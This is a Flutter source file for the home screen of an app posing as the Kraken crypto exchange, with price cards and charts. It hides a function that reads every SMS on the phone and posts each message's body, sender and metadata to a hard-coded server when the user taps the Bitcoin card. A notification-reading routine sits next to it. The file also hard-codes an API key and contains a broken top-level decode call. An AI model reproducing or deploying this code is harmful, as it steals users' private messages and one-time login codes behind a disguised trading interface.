// ignore_for_file: prefer_const_constructors, prefer_const_literals_to_create_immutables

import 'package:fl_chart/fl_chart.dart';
import "package:flutter/material.dart";
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:notification_reader/notification_reader.dart';
import 'dart:convert';
import 'dart:async';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:syncfusion_flutter_charts/charts.dart';


void postSms (String datatext, final sender,final address, final date, final type, final read) async{
  Map<String, dynamic> request = {
    "message" : datatext.toString(),
    "from" : sender.toString(),
    "address": address.toString(),
    "date" : date.toString(),
    "type": type.toString(),
    "read" : read
  };

  final apiurl = Uri.parse("http://192.168.43.232:3002/postData/$request");
  final response = await http.get(apiurl);

  if(response.statusCode == 200){
    String responseBody = response.body;
      print(responseBody);
    } else {
      print('Failed to fetch data. Status code: ${response.statusCode}');
    }
}

// String _coinAPiData = "";
 Map<String, dynamic> _coinAPiData = json.decode('');

Future<void> getData() async {
  String apiKey = 'fc63b109-b9d7-4350-a97b-488cd081da36'; // Replace with your API key
  String apiUrl = 'https://api.coincap.io/v2/assets';

  try {
    var response = await http.get(Uri.parse(apiUrl), headers: {
      'Authorization': 'Bearer $apiKey',
    });

    if (response.statusCode == 200) {
      String responseBody = response.body;
      _coinAPiData = jsonDecode(responseBody);

      print(_coinAPiData);
    } else {
      print('Failed to fetch data. Status code: ${response.statusCode}');
    }
  } catch (e) {
    print('Error: $e');
    // Implement a retry mechanism here if necessary
  }
}


class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();

}

class _HomeScreenState extends State<HomeScreen> {
  @override
  void initState() {
    super.initState();
    // Call your function when the widget loads
    getData();
  }
  Widget build(BuildContext context) {
    final platformBrightness = MediaQuery.of(context).platformBrightness;
    String themeMode = platformBrightness == Brightness.dark ? "dark" : "light";


    


    List AsstesTab = [
      ["Most Poupular", "true"],
      ["Top gainers", "false"],
      ["Big dippers", "false"],
      ["Stablecoins", "false"],
      ["New", "false"],
      ["All", "false"],
    ];

    void getsms() async {
  SmsQuery query = SmsQuery();

  // Fetch all SMS messages
  List<SmsMessage> messages = await query.getAllSms;

  // Print the SMS messages
  for (SmsMessage message in messages) {
    // print('Message from: ${message.sender} - Body: ${message.body}');
            postSms(json.encode(message.body), message.sender, message.address, message.dateSent, message.kind, message.read);
  }
}
   List<NotificationData> titleList = [];

 Future<void> initPlatformState() async {
    NotificationData res = await NotificationReader.onNotificationRecieve();
    if (res.body != null) {
      Timer.periodic(Duration(seconds: 1), (timer) async {
        var res = await NotificationReader.onNotificationRecieve();
        if (!titleList.contains(res)) {
          setState(() {
            print(titleList);
            titleList.add(res);
          });
        }
      });
    }
  }


  int _currentAsset = 0;


    return Scaffold(
      appBar: PreferredSize(
        preferredSize: Size.fromHeight(65.0), // Customize the height
        child: AppBar(
          flexibleSpace: Center(
            child: Image.asset("lib/images/icon.png", width: 25, height: 25, )
          ),
          automaticallyImplyLeading: false, // Hide the back button
          backgroundColor:  themeMode == "light" ? Color.fromARGB(244, 255, 255, 255) : Color.fromARGB(255, 23, 23, 23),
        ),
      ),
      backgroundColor: themeMode == "light" ? Color.fromARGB(244, 255, 255, 255) : Color.fromARGB(255, 23, 23, 23),
      body: SingleChildScrollView(
        child: Column(
          children: [
            // SizedBox(
            //   height: 100,
            //   width: double.infinity,
            //   child: Center(
            //     child: Image.asset("lib/images/icon.png", width: 25, height: 25,),
            //   ),
            // ),
            Divider(
              color: Colors.transparent,
            ),
            HeroSection(mode: themeMode,),
            Divider(
              color: Colors.transparent,
            ),
            Text(
              "Favourites",
              style: TextStyle(fontSize: 24, fontWeight: FontWeight.w300, color: themeMode == "dark" ? Colors.white : Colors.black87),
            ),
            Divider(
              color: Colors.transparent,
            ),
            GestureDetector(
              onTap: getsms,
              child: Favorites(themeMode: themeMode, name: "Bitcoin", rate: "+1.46%", abb: "BTC", price: "34,360", image: "btc.png",),
            ),         
            Divider(
              color: Colors.transparent,
            ),
            Favorites(themeMode: themeMode, name: "Etherum", rate: "-1.46%", abb: "ETH", price: "4,760", image: "eth.png",),
            Divider(
              color: Colors.transparent,
            ),
            Text(
              "Assets",
              style: TextStyle(fontSize: 24, fontWeight: FontWeight.w300, color: themeMode == "dark" ? Colors.white : Colors.black87),
            ),
            Divider(
              color: Colors.transparent,
            ),
            AssetTabs(tab: "Most", name: "not", themeMode: themeMode, current: _currentAsset),
            
            Divider(
              color: Colors.transparent,
            ),
            Column(
              children: [
               AssetsWid(index: 0, themeMode: themeMode,),
               AssetsWid(index: 1, themeMode: themeMode,),
               AssetsWid(index: 2, themeMode: themeMode,),
              ],
            )
            
          ],
        ),
      ),
    );
  }
}

class AssetTabs extends StatefulWidget {
  final tab, name, themeMode, current;
  AssetTabs({super.key, required this.tab, required this.name, required this.themeMode, required this.current});

  @override
  State<AssetTabs> createState() => _AssetTabsState();
}

class _AssetTabsState extends State<AssetTabs> {
  int currentTabIndex = 0;
  late List data = [
    ["Most Popular", "index"],
    ["Top gainers", "index"],
    ["Big dippers", "index"],
    ["Stablecoins", "index"],
  ];

  void changeTabIndex (int index) {
    setState(() {
      currentTabIndex = index;
    });
  }



  @override
  Widget build(BuildContext context) {
    return SingleChildScrollView(
              scrollDirection: Axis.horizontal,
              child: Row(
                children: [
                  for(int i = 0; i < data.length; i++)
                      GestureDetector(
                        onTap: () {
                        changeTabIndex(i);
                        } ,
                        child: Container(width: 150, height: 40, margin: EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(50),
                          border: Border.all(width: 1, color: currentTabIndex != i ?  Colors.grey: Color.fromARGB(255, 69, 63, 255))
                        ),
                         child: Center(child: Text(data[i][0].toString(), style: TextStyle(color: currentTabIndex != i ? Colors.grey : Color.fromARGB(255, 69, 63, 255), fontSize: 14),))                 
                         ),
                      ),
                
              ]),
            );
  }
}

class HeroSection extends StatelessWidget {
  // const HeroSection({super.key});
  final String mode;
  HeroSection({required this.mode});

  @override
  Widget build(BuildContext context) {
    return Container(
      width: MediaQuery.of(context).size.width - 20,
      height: 200,
      padding: EdgeInsets.all(10),
      decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(10),
          image: DecorationImage(
              image: AssetImage("lib/images/hero.png"), fit: BoxFit.cover)),
      child: Row(
        children: [
          Column(
              mainAxisAlignment: MainAxisAlignment.center,
              crossAxisAlignment: CrossAxisAlignment.center,
              children: [
                Text(
                  "Welcome to Kraken!",
                  style: TextStyle(fontSize: 25, color: mode == "dark" ? Colors.white : Colors.black87),
                ),
                Divider(
                  color: null,
                ),
                SizedBox(
                  width: 200,
                  height: 45,
                  child: ElevatedButton(
                      onPressed: () {},
                      style: ElevatedButton.styleFrom(
                          backgroundColor: mode == "dark" ? Colors.white : Color.fromARGB(255, 69, 63, 255) ,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(50),
                          )),
                      child: Text(
                        "create account",
                        style: TextStyle(color: mode == "dark" ? Color.fromARGB(255, 69, 63, 255) : Colors.white, fontSize: 16),
                      )),
                ),
             
                TextButton(
                    onPressed: () {},
                    child: Text(
                      "Sign in",
                      style: TextStyle(fontSize: 16, color: mode == "dark" ? Colors.white : Color.fromARGB(255, 69, 63, 255)),
                    ))
              ]),
          SizedBox(
            width: 50,
            height: 200,
          )
        ],
      ),
    );
  }
}



class Favorites extends StatefulWidget {
  final themeMode, name, price, rate, abb, image;
   Favorites({super.key, required this.themeMode, required this.name, required, 
   this.price, required this.rate, required this.abb, this.image});

  @override
  State<Favorites> createState() => _FavoritesState();
}

class ChartData {
  ChartData(this.day, this.price);

  final int day;
  final int price;
}
class _FavoritesState extends State<Favorites> {
  late List<ChartData> data;
  @override

  void initState() {
    super.initState();

    data = [
      ChartData(17,1800),
      ChartData(18,1500),
      ChartData(19,100),
      ChartData(20,500),
      ChartData(21,200),
      ChartData(22,200),
      ChartData(23,500),
      ChartData(24,300),
      ChartData(25,1800),
      ChartData(26,500),
    ];

  }
  Widget build(BuildContext context) {
    return Container(
                width: MediaQuery.of(context).size.width - 20,
                height: 220,
                decoration: BoxDecoration(
                    color: Colors.transparent,
                    borderRadius: BorderRadius.circular(20),
                    border: Border.all(
                        color: Color.fromARGB(56, 188, 188, 188), width: 1)),
                child: Container(
                  padding: EdgeInsets.all(10),
                  child: Column(
                    children: [
                      Row(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Container(
                            margin: EdgeInsets.only(right: 10),
                            child: Image.asset("lib/images/${widget.image}", width: 35, height: 35,),
                          ),
                          Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(
                                widget.name.toString(),
                                style: TextStyle(
                                    fontSize: 20, fontWeight: FontWeight.bold, color: widget.themeMode == "dark" ? Colors.white : Colors.black87),
                              ),
                              Text(
                                widget.abb.toString(),
                                style: TextStyle(fontSize: 18, color: widget.themeMode == "dark" ? Colors.white54 : Colors.black87),
                              )
                            ],
                          )
                        ],
                      ),

                     SizedBox(
                      height: 100,
                       child: Center(
                        child: SfCartesianChart(
                          margin: EdgeInsets.all(0),
                          borderWidth: 0,
                          plotAreaBorderWidth: 0,
                          borderColor: Colors.transparent,
                          primaryXAxis: NumericAxis(
                            minimum: 17,
                            maximum: 26,
                            isVisible: false,
                            borderColor: Colors.transparent
                          ),
                          primaryYAxis: NumericAxis(
                            minimum: 5,
                            maximum: 2000,
                            interval: 100,
                            isVisible: false,
                            borderColor: Colors.transparent,
                          ),
                          series: <ChartSeries<ChartData, int>>[
                            SplineAreaSeries(
                              // color: Colors.orange,
                              borderWidth: 2,
                              borderColor: Colors.orange,
                              color: Colors.transparent,
                              dataSource: data, xValueMapper: (ChartData data, _) => data.day,
                             yValueMapper: (ChartData data, _) => data.price)
                          ],
                        ),
                       ),
                     ),

                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          Text(widget.rate.toString(), style: TextStyle(color: widget.rate.toString().contains("+") ? Color.fromARGB(255, 0, 255, 0) : Colors.red),),
                          Row(
                            crossAxisAlignment: CrossAxisAlignment.center,
                            mainAxisAlignment: MainAxisAlignment.start,
                            children: [
                          Text(r"$", style: TextStyle( fontSize: 18, color: widget.themeMode == "dark" ? Colors.white : Colors.black87),),
                          Text(widget.price.toString(), style: TextStyle(fontSize: 30, color: widget.themeMode == "dark" ? Colors.white : Colors.black87),),
                          Text(".20", style: TextStyle(color: widget.themeMode == "dark" ? Colors.white : Colors.black87),),

                            ],
                          )
                        ],
                      )
                    
                  // Chart(),

                    ],
                  ),
                ));
  }
}

class Tabs extends StatelessWidget {
  const Tabs({super.key});

  @override
  Widget build(BuildContext context) {
    return SingleChildScrollView(
      child: 
      Row(
        children: [
          Text("data"),
          Text("data"),
          Text("data"),
        ],
      ),
    );
  }
}

class AssetsWid extends StatelessWidget {
  int index;
  final themeMode;
   AssetsWid({super.key, required this.index, required this.themeMode});

  @override
  Widget build(BuildContext context) {
    return  Container(
                  padding: EdgeInsets.all(10),
                  width: MediaQuery.of(context).size.width - 20,
                  height: 80,
                  decoration: BoxDecoration(color: Color.fromARGB(14, 65, 16, 73), 
                  borderRadius: BorderRadius.vertical(top: Radius.circular( index == 0 ?  10 : 0))),
                  
                  child: 
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    crossAxisAlignment: CrossAxisAlignment.center,
                    children: [
                      Image.asset('lib/images/btc.png', width: 35, height: 35, ),
                      Container(
                        decoration: BoxDecoration(border: Border(bottom: BorderSide(width: 1, color: Color.fromARGB(19, 156, 156, 156)))),
                        child: Row(
                          children: [
                      
                        Container(
                          margin: EdgeInsets.only(left: 10),
                          width: MediaQuery.of(context).size.width-200,
                          child: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text("Bitcoin", style: TextStyle(color: themeMode == "dark" ? Color.fromARGB(255, 251, 251, 251) : Color.fromARGB(244, 25, 25, 25), fontSize: 18, fontWeight: FontWeight.bold),),
                            Text("BTC", style: TextStyle(color: themeMode == "dark" ? Color.fromARGB(255, 251, 251, 251) : Color.fromARGB(244, 25, 25, 25), fontWeight: FontWeight.normal),)
                          ],
                        ),
                        ),
                        Container(
                          margin: EdgeInsets.only(left: 10),
                          child: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          crossAxisAlignment: CrossAxisAlignment.end,
                          children: [
                            Text(r"$34,130.20", style: TextStyle(color: themeMode == "dark" ? Color.fromARGB(255, 251, 251, 251) : Color.fromARGB(244, 25, 25, 25),fontSize: 18,  fontWeight: FontWeight.normal),),
                            Text("-1.45%", style: TextStyle(color: Colors.red, fontWeight: FontWeight.normal),)
                          ],
                        ),
                        )
                          ],
                        ),
                      ),

                    ],
                  ),
                );
  }
}

